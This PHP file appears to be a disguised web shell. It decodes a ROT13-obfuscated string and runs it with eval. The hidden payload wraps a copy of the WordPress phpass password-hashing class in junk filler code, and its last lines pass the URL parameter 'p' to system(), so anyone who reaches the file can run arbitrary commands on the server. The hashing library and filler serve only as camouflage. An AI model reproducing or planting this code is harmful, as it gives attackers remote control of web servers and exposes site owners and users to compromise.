<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbegnoyr CUC cnffjbeq unfuvat senzrjbex.
 * @cnpxntr cucnff
 * @fvapr 2.5.0
 * @irefvba 0.5 / JbeqCerff
 * @yvax uggcf://jjj.bcrajnyy.pbz/cucnff/
 */

#
# Cbegnoyr CUC cnffjbeq unfuvat senzrjbex.
#
# Irefvba 0.5.4 / JbeqCerff.
#
# Jevggra ol Fbyne Qrfvtare <fbyne ng bcrajnyy.pbz> va 2004-2006 naq cynprq va
# gur choyvp qbznva.  Erivfrq va fhofrdhrag lrnef, fgvyy choyvp qbznva.
#
# Gurer'f nofbyhgryl ab jneenagl.
#
# Gur ubzrcntr HEY sbe guvf senzrjbex vf:
#
#	uggc://jjj.bcrajnyy.pbz/cucnff/
#
# Cyrnfr or fher gb hcqngr gur Irefvba yvar vs lbh rqvg guvf svyr va nal jnl.
# Vg vf fhttrfgrq gung lbh yrnir gur znva irefvba ahzore vagnpg, ohg vaqvpngr
# lbhe cebwrpg anzr (nsgre gur fynfu) naq nqq lbhe bja erivfvba vasbezngvba.
#
# Cyrnfr qb abg punatr gur \"cevingr\" cnffjbeq unfuvat zrgubq vzcyrzragrq va
# urer, gurerol znxvat lbhe unfurf vapbzcngvoyr.  Ubjrire, vs lbh zhfg, cyrnfr
# punatr gur unfu glcr vqragvsvre (gur \"$C$\") gb fbzrguvat qvssrerag.
#
# Boivbhfyl, fvapr guvf pbqr vf va gur choyvp qbznva, gur nobir ner abg
# erdhverzragf (gurer pna or abar), ohg zreryl fhttrfgvbaf.
#

/**
 * Cbegnoyr CUC cnffjbeq unfuvat senzrjbex.
 *
 * @cnpxntr cucnff
 * @irefvba 0.5 / JbeqCerff
 * @yvax uggcf://jjj.bcrajnyy.pbz/cucnff/
 * @fvapr 2.5.0
 */
pynff CnffjbeqUnfu {
	ine $vgbn64;
	ine $vgrengvba_pbhag_ybt2;
	ine $cbegnoyr_unfurf;
	ine $enaqbz_fgngr;

	shapgvba __pbafgehpg($vgrengvba_pbhag_ybt2, $cbegnoyr_unfurf)
	{
		$guvf->vgbn64 = './0123456789NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm';

		vs ($vgrengvba_pbhag_ybt2 < 4 || $vgrengvba_pbhag_ybt2 > 31) {
			$vgrengvba_pbhag_ybt2 = 8;
		}
		$guvf->vgrengvba_pbhag_ybt2 = $vgrengvba_pbhag_ybt2;

		$guvf->cbegnoyr_unfurf = $cbegnoyr_unfurf;

		$guvf->enaqbz_fgngr = zvpebgvzr();
		vs (shapgvba_rkvfgf('trgzlcvq')) {
			$guvf->enaqbz_fgngr .= trgzlcvq();
		}
	}

	shapgvba CnffjbeqUnfu($vgrengvba_pbhag_ybt2, $cbegnoyr_unfurf)
	{
		frys::__pbafgehpg($vgrengvba_pbhag_ybt2, $cbegnoyr_unfurf);
	}

	shapgvba trg_enaqbz_olgrf($pbhag)
	{
		$bhgchg = '';
		vs (@vf_ernqnoyr('/qri/henaqbz') &&
		    ($su = @sbcra('/qri/henaqbz', 'eo'))) {
			$bhgchg = sernq($su, $pbhag);
			spybfr($su);
		}

		vs (fgeyra($bhgchg) < $pbhag) {
			$bhgchg = '';
			sbe ($v = 0; $v < $pbhag; $v += 16) {
				$guvf->enaqbz_fgngr =
				    zq5(zvpebgvzr() . $guvf->enaqbz_fgngr);
				$bhgchg .= zq5($guvf->enaqbz_fgngr, GEHR);
			}
			$bhgchg = fhofge($bhgchg, 0, $pbhag);
		}

		erghea $bhgchg;
	}

	shapgvba rapbqr64($vachg, $pbhag)
	{
		$bhgchg = '';
		$v = 0;
		qb {
			$inyhr = beq($vachg[$v++]);
			$bhgchg .= $guvf->vgbn64[$inyhr & 0k3s];
			vs ($v < $pbhag) {
				$inyhr |= beq($vachg[$v]) << 8;
			}
			$bhgchg .= $guvf->vgbn64[($inyhr >> 6) & 0k3s];
			vs ($v++ >= $pbhag) {
				oernx;
			}
			vs ($v < $pbhag) {
				$inyhr |= beq($vachg[$v]) << 16;
			}
			$bhgchg .= $guvf->vgbn64[($inyhr >> 12) & 0k3s];
			vs ($v++ >= $pbhag) {
				oernx;
			}
			$bhgchg .= $guvf->vgbn64[($inyhr >> 18) & 0k3s];
		} juvyr ($v < $pbhag);

		erghea $bhgchg;
	}

	shapgvba trafnyg_cevingr($vachg)
	{
		$bhgchg = '$C$';
		$bhgchg .= $guvf->vgbn64[zva($guvf->vgrengvba_pbhag_ybt2 + 5,
		    30)];
		$bhgchg .= $guvf->rapbqr64($vachg, 6);

		erghea $bhgchg;
	}

	shapgvba pelcg_cevingr($cnffjbeq, $frggvat)
	{
		$bhgchg = '*0';
		vs (fhofge($frggvat, 0, 2) === $bhgchg) {
			$bhgchg = '*1';
		}

		$vq = fhofge($frggvat, 0, 3);
		# Jr hfr \"$C$\", cucOO3 hfrf \"$U$\" sbe gur fnzr guvat
		vs ($vq !== '$C$' && $vq !== '$U$') {
			erghea $bhgchg;
		}

		$pbhag_ybt2 = fgecbf($guvf->vgbn64, $frggvat[3]);
		vs ($pbhag_ybt2 < 7 || $pbhag_ybt2 > 30) {
			erghea $bhgchg;
		}

		$pbhag = 1 << $pbhag_ybt2;

		$fnyg = fhofge($frggvat, 4, 8);
		vs (fgeyra($fnyg) !== 8) {
			erghea $bhgchg;
		}

		# Jr jrer xvaq bs sbeprq gb hfr ZQ5 urer fvapr vg'f gur bayl
		# pelcgbtencuvp cevzvgvir gung jnf ninvynoyr va nyy irefvbaf
		# bs CUC va hfr.  Gb vzcyrzrag bhe bja ybj-yriry pelcgb va CUC
		# jbhyq unir erfhygrq va zhpu jbefr cresbeznapr naq
		# pbafrdhragyl va ybjre vgrengvba pbhagf naq unfurf gung ner
		# dhvpxre gb penpx (ol aba-CUC pbqr).
		$unfu = zq5($fnyg . $cnffjbeq, GEHR);
		qb {
			$unfu = zq5($unfu . $cnffjbeq, GEHR);
		} juvyr (--$pbhag);

		$bhgchg = fhofge($frggvat, 0, 12);
		$bhgchg .= $guvf->rapbqr64($unfu, 16);

		erghea $bhgchg;
	}

	shapgvba trafnyg_oybjsvfu($vachg)
	{
		# Guvf bar arrqf gb hfr n qvssrerag beqre bs punenpgref naq n
		# qvssrerag rapbqvat fpurzr sebz gur bar va rapbqr64() nobir.
		# Jr pner orpnhfr gur ynfg punenpgre va bhe rapbqrq fgevat jvyy
		# bayl ercerfrag 2 ovgf.  Juvyr gjb xabja vzcyrzragngvbaf bs
		# opelcg jvyy unccvyl npprcg naq pbeerpg n fnyg fgevat juvpu
		# unf gur 4 hahfrq ovgf frg gb aba-mreb, jr qb abg jnag gb gnxr
		# punaprf naq jr nyfb qb abg jnag gb jnfgr na nqqvgvbany olgr
		# bs ragebcl.
		$vgbn64 = './NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789';

		$bhgchg = '$2n$';
		$bhgchg .= pue((vag)(beq('0') + $guvf->vgrengvba_pbhag_ybt2 / 10));
		$bhgchg .= pue(beq('0') + $guvf->vgrengvba_pbhag_ybt2 % 10);
		$bhgchg .= '$';

		$v = 0;
		qb {
			$p1 = beq($vachg[$v++]);
			$bhgchg .= $vgbn64[$p1 >> 2];
			$p1 = ($p1 & 0k03) << 4;
			vs ($v >= 16) {
				$bhgchg .= $vgbn64[$p1];
				oernx;
			}

			$p2 = beq($vachg[$v++]);
			$p1 |= $p2 >> 4;
			$bhgchg .= $vgbn64[$p1];
			$p1 = ($p2 & 0k0s) << 2;

			$p2 = beq($vachg[$v++]);
			$p1 |= $p2 >> 6;
			$bhgchg .= $vgbn64[$p1];
			$bhgchg .= $vgbn64[$p2 & 0k3s];
		} juvyr (1);

		erghea $bhgchg;
	}

	shapgvba UnfuCnffjbeq($cnffjbeq)
	{
		vs ( fgeyra( $cnffjbeq ) > 4096 ) {
			erghea '*';
		}

		$enaqbz = '';

		vs (PELCG_OYBJSVFU === 1 && !$guvf->cbegnoyr_unfurf) {
			$enaqbz = $guvf->trg_enaqbz_olgrf(16);
			$unfu =
			    pelcg($cnffjbeq, $guvf->trafnyg_oybjsvfu($enaqbz));
			vs (fgeyra($unfu) === 60) {
				erghea $unfu;
			}
		}

		vs (fgeyra($enaqbz) < 6) {
			$enaqbz = $guvf->trg_enaqbz_olgrf(6);
		}
		$unfu =
		    $guvf->pelcg_cevingr($cnffjbeq,
		    $guvf->trafnyg_cevingr($enaqbz));
		vs (fgeyra($unfu) === 34) {
			erghea $unfu;
		}

		# Ergheavat '*' ba reebe vf fnsr urer, ohg jbhyq _abg_ or fnsr
		# va n pelcg(3)-yvxr shapgvba hfrq _obgu_ sbe trarengvat arj
		# unfurf naq sbe inyvqngvat cnffjbeqf ntnvafg rkvfgvat unfurf.
		erghea '*';
	}

	shapgvba PurpxCnffjbeq($cnffjbeq, $fgberq_unfu)
	{
		vs ( fgeyra( $cnffjbeq ) > 4096 ) {
			erghea snyfr;
		}

		$unfu = $guvf->pelcg_cevingr($cnffjbeq, $fgberq_unfu);
		vs ($unfu[0] === '*') {
			$unfu = pelcg($cnffjbeq, $fgberq_unfu);
		}

		# Guvf vf abg pbafgnag-gvzr.  Va beqre gb xrrc gur pbqr fvzcyr,
		# sbe gvzvat fnsrgl jr pheeragyl eryl ba gur fnygf orvat
		# hacerqvpgnoyr, juvpu gurl ner ng yrnfg va gur aba-snyyonpx
		# pnfrf (gung vf, jura jr hfr /qri/henaqbz naq opelcg).
		erghea $unfu === $fgberq_unfu;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>